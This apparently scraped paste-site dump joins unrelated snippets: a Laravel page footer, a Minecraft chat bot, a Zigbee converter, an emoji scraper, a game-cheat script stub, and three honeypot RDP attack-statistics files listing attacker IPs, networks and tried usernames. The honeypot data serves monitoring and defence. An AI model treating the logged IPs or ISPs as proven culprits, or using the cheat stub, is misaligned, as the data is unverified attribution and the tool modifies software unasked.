                                class=""flex items-center justify-center rounded-full bg-[#FDFDFC] dark:bg-[#161615] shadow-[0px_0px_1px_0px_rgba(0,0,0,0.03),0px_1px_2px_0px_rgba(0,0,0,0.06)] w-3.5 h-3.5 border dark:border-[#3E3E3A] border-[#e3e3e0]"">
                                <span class=""rounded-full bg-[#dbdbd7] dark:bg-[#3E3E3A] w-1.5 h-1.5""></span>
                            </span>
                        </span>
                        <span>
                            Leia a
                            <a href=""{{ route('documentacao') }}"" target=""_blank""
                                class=""inline-flex items-center space-x-1 font-medium underline underline-offset-4 text-[#f53003] dark:text-[#FF4433] ml-1"">
                                <span>Documentação</span>
                                <svg width=""10"" height=""11"" viewBox=""0 0 10 11"" fill=""none""
                                    xmlns=""http://www.w3.org/2000/svg"" class=""w-2.5 h-2.5"">
                                    <path d=""M7.70833 6.95834V2.79167H3.54167M2.5 8L7.5 3.00001"" stroke=""currentColor""
                                        stroke-linecap=""square"" />
                                </svg>
                            </a>
                        </span>
                    </li>
                    <li
                        class=""flex items-center gap-4 py-2 relative before:border-l before:border-[#e3e3e0] dark:before:border-[#3E3E3A] before:bottom-1/2 before:top-0 before:left-[0.4rem] before:absolute"">
                        <span class=""relative py-1 bg-white dark:bg-[#161615]"">
                            <span
                                class=""flex items-center justify-center rounded-full bg-[#FDFDFC] dark:bg-[#161615] shadow-[0px_0px_1px_0px_rgba(0,0,0,0.03),0px_1px_2px_0px_rgba(0,0,0,0.06)] w-3.5 h-3.5 border dark:border-[#3E3E3A] border-[#e3e3e0]"">
                                <span class=""rounded-full bg-[#dbdbd7] dark:bg-[#3E3E3A] w-1.5 h-1.5""></span>
                            </span>
                        </span>
                        <span>
                            Assista aos tutoriais em vídeo
                            <a href=""{{ route('documentacao') }}"" target=""_blank""
                                class=""inline-flex items-center space-x-1 font-medium underline underline-offset-4 text-[#f53003] dark:text-[#FF4433] ml-1"">
                                <span>Moraws</span>
                                <svg width=""10"" height=""11"" viewBox=""0 0 10 11"" fill=""none""
                                    xmlns=""http://www.w3.org/2000/svg"" class=""w-2.5 h-2.5"">
                                    <path d=""M7.70833 6.95834V2.79167H3.54167M2.5 8L7.5 3.00001"" stroke=""currentColor""
                                        stroke-linecap=""square"" />
                                </svg>
                            </a>
                        </span>
                    </li>
                </ul>

            </div>
            <div
                class=""relative lg:-ml-px -mb-px lg:mb-0 rounded-t-lg lg:rounded-t-none lg:rounded-r-lg aspect-[335/376] lg:aspect-auto w-full lg:w-[438px] shrink-0 overflow-hidden"">
                <div class=""flex flex-col items-center h-full"">
                    <!-- Moraws Logo - Responsive SVG -->
                    <div class=""w-full max-w-[400px] lg:max-w-none"">
                        <svg viewBox=""0 0 9525 1719.78"" fill=""none"" xmlns=""http://www.w3.org/2000/svg""
                            class=""w-full h-auto transition-all translate-y-0 opacity-100 duration-750 starting:opacity-0 starting:translate-y-6""
                            preserveAspectRatio=""xMidYMid meet"">
                            <path
                                d=""M30.92 1656.51V65.6h197.99l572.62 668.12L1374.92 65.6h198v1590.91h-221.29V414.6l-550.1 640.95L252.2 414.6v1241.91z""
                                fill=""#99f"" />
                            <path id=""1""
                                d=""M2069.44 862.61c0 81.13 15.14 158.78 45.42 232.15s74.15 138.59 130.83 195.66c55.52 56.68 120.35 100.55 195.28 131.22 74.53 30.67 152.56 46.2 233.7 46.2 83.08 0 161.5-15.14 234.87-45.04 72.99-29.89 138.6-74.15 196.05-132.38 56.68-57.07 100.55-122.29 131.22-195.66 30.67-73.37 46.2-151.02 46.2-232.15 0-81.14-15.14-157.62-45.42-230.22-30.28-72.2-75.32-138.59-134.33-198.37-56.68-58.62-121.9-102.88-195.66-133.55-73.37-30.67-151.01-46.2-232.93-46.2-79.19 0-155.28 15.53-229.43 46.59-73.77 31.05-140.54 75.31-199.55 133.16-56.68 55.12-100.55 119.95-130.83 194.49-30.28 74.15-45.42 152.18-45.42 234.1zm-242.25-8.54c0-105.99 21.74-209.25 64.84-309.02 43.09-100.16 104.82-188.68 184.4-265.16 81.14-78.03 172.76-137.42 275.25-178.58 102.1-40.76 210.02-61.33 322.99-61.33 114.91 0 224.39 20.57 328.04 62.11 103.27 41.15 194.5 100.55 273.31 177.8 82.69 80.36 144.8 170.04 186.73 268.26 41.54 98.61 62.5 205.76 62.5 321.06 0 108.31-21.35 212.35-64.44 312.12-42.7 99.77-103.65 187.51-182.46 263.21-82.69 78.81-174.7 138.6-276.8 178.97-102.1 40.76-211.19 60.95-326.88 60.95-112.97 0-221.28-20.96-324.94-62.5-103.26-41.93-194.49-100.94-273.3-177.42-81.91-79.58-144.03-169.65-185.96-269.42-42.31-100.16-63.28-207.31-63.28-321.05z""
                                fill=""#99f"" />
                            <path id=""2""
                                d=""M3776.43 1656.51V65.6h465.86c160.72 0 284.95 38.04 372.3 113.75 87.35 75.7 130.83 183.23 130.83 321.83 0 104.82-24.07 189.06-71.82 252.73-48.14 63.66-123.45 111.41-227.11 143.25 26.79 14.36 51.63 33.38 75.32 57.45 23.68 23.69 53.96 63.67 91.23 119.96l386.27 581.94h-275.24l-272.92-417.33c-81.91-125.79-147.91-206.15-198.38-240.7-50.08-34.94-110.25-52.41-179.74-52.41h-68.33v710.44h-228.27zm228.27-901.44h188.67c105.99 0 185.18-20.57 237.98-61.34 52.41-41.15 78.81-103.65 78.81-187.89 0-86.58-24.85-149.08-74.93-188.29-50.08-39.21-130.83-58.62-241.86-58.62H4004.7v496.14z""
                                fill=""#99f"" />
                            <path id=""3""
                                d=""M5398.01 983.34h495.75l-251.18-573.01-244.57 573.01zm-524.48 673.17L5563 65.6h165.77l698.4 1590.91h-235.26l-204.98-468.19H5309.1l-202.26 468.19h-233.31z""
                                fill=""#99f"" />
                            <path id=""4""
                                d=""M6884.87 1668.16 6295.56 65.6h235.26l389.38 1085.84L7348.79 65.6h144.42l424.32 1088.17L8312.74 65.6h230.6l-598.63 1602.56h-51.25L7418.28 442.94l-479.83 1225.22z""
                                fill=""#99f"" />
                            <path id=""5""
                                d=""M8592.64 1532.28v-299.7c72.21 82.69 140.93 142.08 206.53 178.58 65.61 36.1 135.49 54.35 209.64 54.35 78.81 0 140.92-18.25 186.35-55.13 45.42-36.88 68.32-86.57 68.32-149.46 0-51.64-15.14-97.06-45.81-135.88-30.67-39.21-104.04-95.5-219.73-168.87-180.13-116.08-292.71-206.15-338.91-269.81-45.81-63.67-68.72-139.76-68.72-227.5 0-123.84 43.87-225.16 131.22-304.75 87.74-79.19 200.71-118.79 338.53-118.79 61.33 0 121.9 8.93 181.68 26.78 59.4 17.86 119.57 45.43 180.13 82.69v258.56c-69.87-56.29-133.93-97.06-193.33-122.68-59.01-25.23-118.02-38.05-177.02-38.05-71.44 0-129.67 17.47-174.7 52.8-45.04 35.33-67.55 80.75-67.55 136.27 0 78.8 93.56 176.64 280.29 293.49l34.16 20.57c152.57 94.73 252.73 178.2 299.71 250.4 46.97 72.6 70.65 162.28 70.65 269.04 0 121.12-43.87 221.28-131.99 300.48-88.13 79.19-200.71 118.79-338.14 118.79-85.79 0-163.05-12.03-232.15-36.49-69.1-24.07-135.49-62.5-199.16-115.69z""
                                fill=""#99f"" />
                        </svg>
                    </div>

                    <!-- Light Mode JM SVG -->
                    <div class=""w-full max-w-[400px] dark:hidden"">
                        <svg viewBox=""0 0 440 376"" fill=""none"" xmlns=""http://www.w3.org/2000/svg""
                            class=""w-full h-auto transition-all delay-300 translate-y-0 opacity-100 duration-750 starting:opacity-0 starting:translate-y-4""
                            preserveAspectRatio=""xMidYMid meet"">
                            <g>
                                <path
                                    d=""M 56.53 6.41 h 152.93 v 366.88 L 70.37 178.11 h 62.28 l 33.07 45.89 V 69.06 H 74.71 l -9.85 13.81 L 87.53 115.2 l -62.43 0.5 L 2 84 z""
                                    style=""fill:#99f"" />
                                <path
                                    d=""M229.93 6.29h152.83l54.2 76.26-72.48 101.38-0.18-87.61 9.85-13.31-9.67-13.81-23.22-0.25-0.35 148.54-43.63 61.17-1.76-206.77H271.3l1.05 239.85-45.03 61.17z""
                                    style=""fill:#99f;fill-opacity:.811765"" />
                            </g>
                        </svg>
                    </div>

                    <!-- Dark Mode JM SVG -->
                    <div class=""w-full max-w-[448px] hidden dark:block"">
                        <svg viewBox=""0 0 440 376"" fill=""none"" xmlns=""http://www.w3.org/2000/svg""
                            class=""w-full h-auto transition-all delay-300 translate-y-0 opacity-100 duration-750 starting:opacity-0 starting:translate-y-4""
                            preserveAspectRatio=""xMidYMid meet"">
                            <g>
                                <path
                                    d=""M 56.53 6.41 h 152.93 v 366.88 L 70.37 178.11 h 62.28 l 33.07 45.89 V 69.06 H 74.71 l -9.85 13.81 L 87.53 115.2 l -62.43 0.5 L 2 84 z""
                                    style=""fill:#ffffff"" />
                                <path
                                    d=""M229.93 6.29h152.83l54.2 76.26-72.48 101.38-0.18-87.61 9.85-13.31-9.67-13.81-23.22-0.25-0.35 148.54-43.63 61.17-1.76-206.77H271.3l1.05 239.85-45.03 61.17z""
                                    style=""fill:#ffffff"" />
                            </g>
                        </svg>
                    </div>
                </div>
                <div class=""absolute inset-0 rounded-t-lg lg:rounded-t-none lg:rounded-r-lg"">
                </div>
            </div>
        </main>
    </div>

    @if (Route::has('login'))
        <div class=""h-14.5 hidden lg:block""></div>
    @endif
    <!-- Footer -->
    <footer class=""bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700 py-4"">
        <div class=""max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-sm text-gray-500 dark:text-gray-400"">
            Desenvolvido com
            <svg class=""inline-block size-4"" xmlns=""http://www.w3.org/2000/svg"" fill=""#38BDF8"" viewBox=""0 0 24 24"">
                <path
                    d=""M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"" />
            </svg> por J.M.Moraes
            © {{ date('Y') }}
        </div>
    </footer>
</body>

</html>
"
XZb6sXej,spatialInfoBot,Myros27,Lua,Thursday 12th of June 2025 07:43:26 PM CDT,"--[[
    Spatial InfoBot

    A dedicated, read-only bot that provides information about the spatial system.
    It listens for specific chat commands and responds with helpful, interactive messages.
    This bot does NOT move or modify any disks.
]]

-- =========================================================================
--  Core Helper Functions (from previous steps)
-- =========================================================================

local function findPeripheralByType(typeName)
    for _, name in ipairs(peripheral.getNames()) do
        if peripheral.getType(name) == typeName then return name end
    end
    return nil
end

function listMeDiskNames()
    local bridgeName = findPeripheralByType(""meBridge"")
    if not bridgeName then return nil, ""ME Bridge peripheral not found."" end
    local bridge = peripheral.wrap(bridgeName)
    local all_items = bridge.listItems()
    if not all_items then return nil, ""Could not access ME system contents."" end
    local disk_data = {}
    for _, item in ipairs(all_items) do
        if item.name and string.find(item.name, ""storage_cell"") then
            local cleaned_name = string.gsub(item.displayName, ""[%[%]]"", """")
            cleaned_name = string.gsub(cleaned_name, ""^%s*(.-)%s*$"", ""%1"")
            table.insert(disk_data, { name = cleaned_name, fingerprint = item.fingerprint })
        end
    end
    return disk_data, nil
end

function notifyUser(message, options)
    local chatBox = peripheral.find(""chatBox"")
    if not chatBox then printError(""Chat Box not found."") return end
    options = options or {}
    local prefix = options.prefix or ""InfoBot""
    local brackets = options.brackets or ""[]""
    local bracketColor = options.bracketColor or ""&7""
    local targetUser = options.user
    local messageBody = {}
    local lastPos = 1
    while true do
        local start, finish = string.find(message, ""{(.-)}"", lastPos)
        if not start then break end
        local beforeText = message:sub(lastPos, start - 1)
        if #beforeText > 0 then table.insert(messageBody, { text = beforeText, color = ""white"", underlined = false }) end
        local inside = message:sub(start + 1, finish - 1)
        local inlineOpts = {}
        for key, value in string.gmatch(inside, ""(%w+)%s*=%s*'([^']*)'"") do inlineOpts[string.gsub(key, ""%s"", """")] = value end
        if inlineOpts.msg then
            local component = { text = inlineOpts.msg, color = inlineOpts.color or ""aqua"", underlined = (inlineOpts.underlined == 'true') }
            if inlineOpts.clickAction and inlineOpts.value then component.clickEvent = { action = inlineOpts.clickAction, value = inlineOpts.value } end
            table.insert(messageBody, component)
        else
            table.insert(messageBody, { text = ""{"" .. inside .. ""}"", color = ""white"", underlined = false })
        end
        lastPos = finish + 1
    end
    local remainingText = message:sub(lastPos)
    if #remainingText > 0 then table.insert(messageBody, { text = remainingText, color = ""white"", underlined = false }) end
    local jsonMessage = textutils.serialiseJSON(messageBody)
    if targetUser and targetUser ~= """" then
        chatBox.sendFormattedMessageToPlayer(jsonMessage, targetUser, prefix, brackets, bracketColor)
    else
        chatBox.sendFormattedMessage(jsonMessage, prefix, brackets, bracketColor)
    end
end


-- =========================================================================
--  Specific Command Handlers
-- =========================================================================

--- Handles the '@all' command.
function handleAllCommand(userName)
    notifyUser(""Use '@spatial help' for my commands"", { user = userName, prefix = ""SpatialBot"" })
end

--- Handles the '@spatial help' command.
function handleHelpCommand(userName)
    local helpText = ""Commands: @spatial move <disk> <location>, @spatial clear <disk|location>, @disks. Example: @spatial move expFarm here""
    notifyUser(helpText, { user = userName, prefix = ""Help"", brackets = ""()"" })
end

--- Handles the '@disks' command by generating a clickable list.
function handleListDisksCommand(userName)
    local disks, err = listMeDiskNames()
    if err then
        notifyUser(""Error: "" .. err, { user = userName, prefix = ""Error"", bracketColor = ""&c"" })
        return
    end
    if #disks == 0 then
        notifyUser(""No storage disks found in the ME system."", { user = userName, prefix = ""Disks"" })
        return
    end

    -- Build the message template with a clickable block for each disk
    local messageParts = {}
    for _, diskData in ipairs(disks) do
        local diskName = diskData.name
        local command = ""@spatial move "" .. diskName .. "" here""
        local clickablePart = ""{ msg = '"" .. diskName .. ""', clickAction = 'suggest_command', value = '"" .. command .. ""' }""
        table.insert(messageParts, clickablePart)
    end

    -- Join the clickable parts with commas and send the message
    local messageTemplate = ""Available Disks: "" .. table.concat(messageParts, "", "")
    notifyUser(messageTemplate, { user = userName, prefix = ""Disks"" })
end


-- =========================================================================
--  Main Command Router and Listener Loop
-- =========================================================================

--- The main command router. It checks the command and calls the correct handler.
function handleCommand(userName, arg1, arg2)
    if arg1 == ""@all"" then
        handleAllCommand(userName)
    elseif arg1 == ""@spatial"" and arg2 == ""help"" then
        handleHelpCommand(userName)
    elseif arg1 == ""@disks"" then
        handleListDisksCommand(userName)
    end
end

--- The main function that listens for chat events and dispatches commands.
local function runChatListener()
    print(""InfoBot command listener is now active. Waiting for messages..."")
    while true do
        local event, username, message = os.pullEvent(""chat"")
        local args = {}
        for word in string.gmatch(message, ""[^%s]+"") do
            table.insert(args, word)
        end
        handleCommand(username, args[1] or """", args[2] or """")
    end
end

-- Start the listener.
runChatListener()"
BkAhhM3u,2025-06-11_stats.json,rdp_snitch,JSON,Thursday 12th of June 2025 07:18:30 PM CDT,"{
  ""ip"": {
    ""142.93.217.191"": 11124,
    ""167.172.131.118"": 6855,
    ""14.194.131.202"": 8088,
    ""24.173.30.170"": 858,
    ""68.183.179.179"": 3,
    ""80.94.95.203"": 3,
    ""157.230.39.160"": 18,
    ""205.210.31.129"": 9,
    ""111.170.152.113"": 12,
    ""80.66.79.30"": 1092,
    ""147.185.132.24"": 9,
    ""206.189.43.109"": 2949,
    ""194.165.16.161"": 6,
    ""88.214.25.124"": 6,
    ""167.94.145.109"": 3,
    ""162.142.125.126"": 3,
    ""167.94.138.165"": 3,
    ""92.63.197.23"": 15,
    ""206.189.35.0"": 12,
    ""78.142.18.92"": 3,
    ""205.210.31.238"": 9,
    ""146.190.167.180"": 9,
    ""64.64.112.135"": 2667,
    ""165.232.175.227"": 60,
    ""101.36.118.248"": 3,
    ""198.235.24.228"": 9,
    ""64.64.112.140"": 402,
    ""64.64.112.139"": 3
  },
  ""asn"": {
    ""AS14061"": 21030,
    ""AS45820"": 8088,
    ""AS11427"": 858,
    ""AS204428"": 3,
    ""AS396982"": 36,
    ""AS151185"": 12,
    ""AS60602"": 1092,
    ""AS48721"": 6,
    ""AS35042"": 6,
    ""AS398705"": 3,
    ""AS398324"": 6,
    ""AS210848"": 15,
    ""AS213438"": 3,
    ""AS137409"": 3072,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 21030,
    ""Tata Tele Services GSM"": 8088,
    ""Charter Communications Inc"": 858,
    ""SS-Net"": 3,
    ""Google LLC"": 36,
    ""China Telecom"": 12,
    ""HYPER-HOSTING"": 1092,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Censys, Inc."": 9,
    ""Telkom Internet LTD"": 15,
    ""ColocaTel Inc."": 3,
    ""GSL Networks Pty LTD"": 3072,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 21030,
    ""Unknown"": 9180,
    ""Spectrum"": 858,
    ""Unmanaged LTD"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Chinanet HB"": 12,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Censys, Inc."": 3,
    ""Censys Inc"": 3,
    ""Censys, Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""ColocationX Ltd"": 3,
    ""LogicWeb Inc"": 3072,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Karnataka"": 11124,
    ""New Jersey"": 6855,
    ""Gujarat"": 8088,
    ""Texas"": 858,
    ""South West"": 3042,
    ""Budapest"": 3,
    ""California"": 45,
    ""Hubei"": 12,
    ""Chi\u0219in\u0103u Municipality"": 1092,
    ""Kaunas"": 6,
    ""Kowloon City"": 6,
    ""Michigan"": 9,
    ""North Holland"": 18,
    ""Dhaka Division"": 3072,
    ""Kowloon"": 3
  },
  ""country"": {
    ""India"": 19212,
    ""United States"": 7767,
    ""Singapore"": 3042,
    ""Hungary"": 3,
    ""China"": 12,
    ""Moldova"": 1092,
    ""Lithuania"": 6,
    ""Hong Kong"": 9,
    ""The Netherlands"": 18,
    ""Bangladesh"": 3072
  },
  ""account"": {
    ""hello"": 34152,
    ""Administr"": 21,
    ""kEVTURBtb"": 3,
    ""IuFPnt"": 3,
    ""xdrOKc"": 3,
    ""LjuHxOYyp"": 3,
    ""gHCjbY"": 3,
    ""kxZmDv"": 3,
    ""Test"": 12,
    ""(empty)"": 9,
    ""siSNnldGg"": 3,
    ""uxsTkQ"": 3,
    ""yYDrNx"": 3,
    ""Administrator"": 3,
    ""SjejVjijD"": 3,
    ""TZVeRz"": 3,
    ""DvKNLP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 34233
  },
  ""client_build"": {
    ""Unknown"": 34233
  },
  ""client_name"": {
    ""Unknown"": 34233
  },
  ""ip_type"": {
    ""hosting"": 22161,
    ""Unknown"": 9000,
    ""proxy"": 3072
  }
}"
XyhT7BzF,2025-06-11_stats.json,rdp_snitch,JSON,Thursday 12th of June 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""142.93.217.191"": 11123,
    ""167.172.131.118"": 6855,
    ""14.194.131.202"": 8088,
    ""24.173.30.170"": 858,
    ""68.183.179.179"": 3,
    ""80.94.95.203"": 3,
    ""157.230.39.160"": 18,
    ""205.210.31.129"": 9,
    ""111.170.152.113"": 12,
    ""80.66.79.30"": 1092,
    ""147.185.132.24"": 9,
    ""206.189.43.109"": 2949,
    ""194.165.16.161"": 6,
    ""88.214.25.124"": 6,
    ""167.94.145.109"": 3,
    ""162.142.125.126"": 3,
    ""167.94.138.165"": 3,
    ""92.63.197.23"": 15,
    ""206.189.35.0"": 12,
    ""78.142.18.92"": 3,
    ""205.210.31.238"": 9,
    ""146.190.167.180"": 9,
    ""64.64.112.135"": 2667,
    ""165.232.175.227"": 60,
    ""101.36.118.248"": 3,
    ""198.235.24.228"": 9,
    ""64.64.112.140"": 402,
    ""64.64.112.139"": 3
  },
  ""asn"": {
    ""AS14061"": 21029,
    ""AS45820"": 8088,
    ""AS11427"": 858,
    ""AS204428"": 3,
    ""AS396982"": 36,
    ""AS151185"": 12,
    ""AS60602"": 1092,
    ""AS48721"": 6,
    ""AS35042"": 6,
    ""AS398705"": 3,
    ""AS398324"": 6,
    ""AS210848"": 15,
    ""AS213438"": 3,
    ""AS137409"": 3072,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 21029,
    ""Tata Tele Services GSM"": 8088,
    ""Charter Communications Inc"": 858,
    ""SS-Net"": 3,
    ""Google LLC"": 36,
    ""China Telecom"": 12,
    ""HYPER-HOSTING"": 1092,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Censys, Inc."": 9,
    ""Telkom Internet LTD"": 15,
    ""ColocaTel Inc."": 3,
    ""GSL Networks Pty LTD"": 3072,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 21029,
    ""Unknown"": 9180,
    ""Spectrum"": 858,
    ""Unmanaged LTD"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Chinanet HB"": 12,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Censys, Inc."": 3,
    ""Censys Inc"": 3,
    ""Censys, Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""ColocationX Ltd"": 3,
    ""LogicWeb Inc"": 3072,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Karnataka"": 11123,
    ""New Jersey"": 6855,
    ""Gujarat"": 8088,
    ""Texas"": 858,
    ""South West"": 3042,
    ""Budapest"": 3,
    ""California"": 45,
    ""Hubei"": 12,
    ""Chi\u0219in\u0103u Municipality"": 1092,
    ""Kaunas"": 6,
    ""Kowloon City"": 6,
    ""Michigan"": 9,
    ""North Holland"": 18,
    ""Dhaka Division"": 3072,
    ""Kowloon"": 3
  },
  ""country"": {
    ""India"": 19211,
    ""United States"": 7767,
    ""Singapore"": 3042,
    ""Hungary"": 3,
    ""China"": 12,
    ""Moldova"": 1092,
    ""Lithuania"": 6,
    ""Hong Kong"": 9,
    ""The Netherlands"": 18,
    ""Bangladesh"": 3072
  },
  ""account"": {
    ""hello"": 34151,
    ""Administr"": 21,
    ""kEVTURBtb"": 3,
    ""IuFPnt"": 3,
    ""xdrOKc"": 3,
    ""LjuHxOYyp"": 3,
    ""gHCjbY"": 3,
    ""kxZmDv"": 3,
    ""Test"": 12,
    ""(empty)"": 9,
    ""siSNnldGg"": 3,
    ""uxsTkQ"": 3,
    ""yYDrNx"": 3,
    ""Administrator"": 3,
    ""SjejVjijD"": 3,
    ""TZVeRz"": 3,
    ""DvKNLP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 34232
  },
  ""client_build"": {
    ""Unknown"": 34232
  },
  ""client_name"": {
    ""Unknown"": 34232
  },
  ""ip_type"": {
    ""hosting"": 22160,
    ""Unknown"": 9000,
    ""proxy"": 3072
  }
}"
tD4FhN2c,2025-06-11_stats.json,rdp_snitch,JSON,Thursday 12th of June 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""142.93.217.191"": 11122,
    ""167.172.131.118"": 6855,
    ""14.194.131.202"": 8088,
    ""24.173.30.170"": 858,
    ""68.183.179.179"": 3,
    ""80.94.95.203"": 3,
    ""157.230.39.160"": 18,
    ""205.210.31.129"": 9,
    ""111.170.152.113"": 12,
    ""80.66.79.30"": 1092,
    ""147.185.132.24"": 9,
    ""206.189.43.109"": 2949,
    ""194.165.16.161"": 6,
    ""88.214.25.124"": 6,
    ""167.94.145.109"": 3,
    ""162.142.125.126"": 3,
    ""167.94.138.165"": 3,
    ""92.63.197.23"": 15,
    ""206.189.35.0"": 12,
    ""78.142.18.92"": 3,
    ""205.210.31.238"": 9,
    ""146.190.167.180"": 9,
    ""64.64.112.135"": 2667,
    ""165.232.175.227"": 60,
    ""101.36.118.248"": 3,
    ""198.235.24.228"": 9,
    ""64.64.112.140"": 402,
    ""64.64.112.139"": 3
  },
  ""asn"": {
    ""AS14061"": 21028,
    ""AS45820"": 8088,
    ""AS11427"": 858,
    ""AS204428"": 3,
    ""AS396982"": 36,
    ""AS151185"": 12,
    ""AS60602"": 1092,
    ""AS48721"": 6,
    ""AS35042"": 6,
    ""AS398705"": 3,
    ""AS398324"": 6,
    ""AS210848"": 15,
    ""AS213438"": 3,
    ""AS137409"": 3072,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 21028,
    ""Tata Tele Services GSM"": 8088,
    ""Charter Communications Inc"": 858,
    ""SS-Net"": 3,
    ""Google LLC"": 36,
    ""China Telecom"": 12,
    ""HYPER-HOSTING"": 1092,
    ""Flyservers S.A."": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Censys, Inc."": 9,
    ""Telkom Internet LTD"": 15,
    ""ColocaTel Inc."": 3,
    ""GSL Networks Pty LTD"": 3072,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 21028,
    ""Unknown"": 9180,
    ""Spectrum"": 858,
    ""Unmanaged LTD"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Chinanet HB"": 12,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Censys, Inc."": 3,
    ""Censys Inc"": 3,
    ""Censys, Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""ColocationX Ltd"": 3,
    ""LogicWeb Inc"": 3072,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Karnataka"": 11122,
    ""New Jersey"": 6855,
    ""Gujarat"": 8088,
    ""Texas"": 858,
    ""South West"": 3042,
    ""Budapest"": 3,
    ""California"": 45,
    ""Hubei"": 12,
    ""Chi\u0219in\u0103u Municipality"": 1092,
    ""Kaunas"": 6,
    ""Kowloon City"": 6,
    ""Michigan"": 9,
    ""North Holland"": 18,
    ""Dhaka Division"": 3072,
    ""Kowloon"": 3
  },
  ""country"": {
    ""India"": 19210,
    ""United States"": 7767,
    ""Singapore"": 3042,
    ""Hungary"": 3,
    ""China"": 12,
    ""Moldova"": 1092,
    ""Lithuania"": 6,
    ""Hong Kong"": 9,
    ""The Netherlands"": 18,
    ""Bangladesh"": 3072
  },
  ""account"": {
    ""hello"": 34150,
    ""Administr"": 21,
    ""kEVTURBtb"": 3,
    ""IuFPnt"": 3,
    ""xdrOKc"": 3,
    ""LjuHxOYyp"": 3,
    ""gHCjbY"": 3,
    ""kxZmDv"": 3,
    ""Test"": 12,
    ""(empty)"": 9,
    ""siSNnldGg"": 3,
    ""uxsTkQ"": 3,
    ""yYDrNx"": 3,
    ""Administrator"": 3,
    ""SjejVjijD"": 3,
    ""TZVeRz"": 3,
    ""DvKNLP"": 3
  },
  ""keyboard"": {
    ""Unknown"": 34231
  },
  ""client_build"": {
    ""Unknown"": 34231
  },
  ""client_name"": {
    ""Unknown"": 34231
  },
  ""ip_type"": {
    ""hosting"": 22159,
    ""Unknown"": 9000,
    ""proxy"": 3072
  }
}"
p9qttAAE,mg-zg04w.mjs,bdnstn,JavaScript,Thursday 12th of June 2025 06:23:33 PM CDT,"// This converter is based on converters MG-ZG01W, MG-ZG02W, MG-ZG03W 
// for the one, two and three gang switches which work with those
// switches from the same supplier.
// I copied the fingerprint from Zigbee Model and Manufacturer
// found by Z2M in unsupported device.

import * as tuya from 'zigbee-herdsman-converters/lib/tuya';
const e = exposes.presets;

export default {
    fingerprint: tuya.fingerprint('TS0601', ['_TZE204_mexisfik']),
    model: 'MG-ZG04W',
    vendor: 'TuYa',
    description: '4 gang switch',
    fromZigbee: [tuya.fz.datapoints],
    toZigbee: [tuya.tz.datapoints],
    configure: tuya.configureMagicPacket,
    exposes: [
        e.switch().withEndpoint('l1').setAccess('state', ea.STATE_SET),
        e.switch().withEndpoint('l2').setAccess('state', ea.STATE_SET),
        e.switch().withEndpoint('l3').setAccess('state', ea.STATE_SET),
        e.switch().withEndpoint('l4').setAccess('state', ea.STATE_SET),
    ],
    meta: {
        multiEndpoint: true,
        tuyaDatapoints: [
            [1, 'state_l1', tuya.valueConverter.onOff],
            [2, 'state_l2', tuya.valueConverter.onOff],
            [3, 'state_l3', tuya.valueConverter.onOff],
            [4, 'state_l4', tuya.valueConverter.onOff],
        ],
    },
    endpoint: (device) => {
        return {'l1': 1, 'l2': 1, 'l3': 1, 'l4': 1};
    }
}"
up3Mfbdu,download emojis,sawczakl,Python,Thursday 12th of June 2025 06:19:29 PM CDT,"import bs4
import requests
from pathlib import Path

URL = 'https://emojiisland.com/pages/free-download-emoji-icons-png'

path_out = Path('emojis')
if not path_out.exists():
    path_out.mkdir(parents=True)

page_data = requests.get(URL, stream=True)
page_html = page_data.content

soup = bs4.BeautifulSoup(page_html)
for (n, img) in enumerate(soup.find_all('img')):
    src = img['src']
    if not src.startswith('http'):
        src = f'http:{src}'

    alt = img.get('alt')
    if alt and ('Download' in alt) and ('Emoji' in alt):
        alt = alt.split('Download')[1].strip()
        alt = alt.split('Emoji')[0].strip()
        alt = alt.replace(' ', '-').lower()
        if not alt:
            fname = n

        fname = f'{alt}.png'
        img_data = requests.get(src)
        with open(path_out / fname, 'wb') as f:
            f.write(img_data.content)
            print(f'wrote {fname}')
"
RCQn12Sx,BASEAddr,cnsnipermike,Lua,Thursday 12th of June 2025 04:57:24 PM CDT,"gg.showUiButton()
gg.alert(""已切換到基址查詢模式\n\n點擊 SX 按鈕可調出功能表\n同時也可以使用修改器功能"")
function Start()
MAIN = gg.choice({
""查询"",
""返回"",
""退出"",
})
if MAIN == nil then
else
if MAIN == 1 then CK() end
